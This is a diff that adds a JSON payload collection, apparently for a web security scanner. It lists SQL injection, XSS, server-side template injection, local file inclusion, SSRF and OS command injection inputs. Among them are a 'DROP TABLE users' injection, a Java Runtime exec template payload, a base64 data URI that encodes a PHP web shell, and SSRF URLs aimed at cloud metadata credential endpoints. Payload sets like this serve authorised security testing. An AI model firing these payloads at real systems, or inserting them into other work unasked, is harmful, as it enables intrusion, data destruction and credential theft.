@@ -1,0 +1,90 @@
+{
+  "version": "1.0",
+  "payloads": {
+    "sqli": {
+      "description": "SQL Injection test payloads",
+      "payloads": [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "' OR 1=1#",
+        "admin'--",
+        "1; DROP TABLE users--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+        "1 OR 1=1",
+        "\" OR \"\"=\"",
+        "'; WAITFOR DELAY '0:0:5'--"
+      ]
+    },
+    "xss": {
+      "description": "Cross-Site Scripting payloads",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "javascript:alert(1)",
+        "<body onload=alert(1)>",
+        "'-alert(1)-'",
+        "\"><script>alert(1)</script>",
+        "<iframe src=\"javascript:alert(1)\">",
+        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+        "%3Cscript%3Ealert(1)%3C/script%3E"
+      ]
+    },
+    "ssti": {
+      "description": "Server-Side Template Injection payloads",
+      "payloads": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "{{config}}",
+        "{{self.__class__.__mro__[1].__subclasses__()}}",
+        "${T(java.lang.Runtime).getRuntime().exec('id')}",
+        "{{''.__class__.mro()[1].__subclasses__()}}"
+      ]
+    },
+    "lfi": {
+      "description": "Local File Inclusion payloads",
+      "payloads": [
+        "../../../etc/passwd",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "/etc/passwd%00",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://input",
+        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+      ]
+    },
+    "ssrf": {
+      "description": "Server-Side Request Forgery payloads",
+      "payloads": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://[::]:80/",
+        "http://0.0.0.0:80/",
+        "http://localhost/admin",
+        "file:///etc/passwd",
+        "dict://localhost:11211/",
+        "gopher://localhost:11211/"
+      ]
+    },
+    "command_injection": {
+      "description": "OS Command Injection payloads",
+      "payloads": [
+        "; id",
+        "| id",
+        "&& id",
+        "|| id",
+        "$(id)",
+        "`id`",
+        "; sleep 5",
+        "| sleep 5",
+        "%0a id",
+        "1;id"
+      ]
+    }
+  }
+}
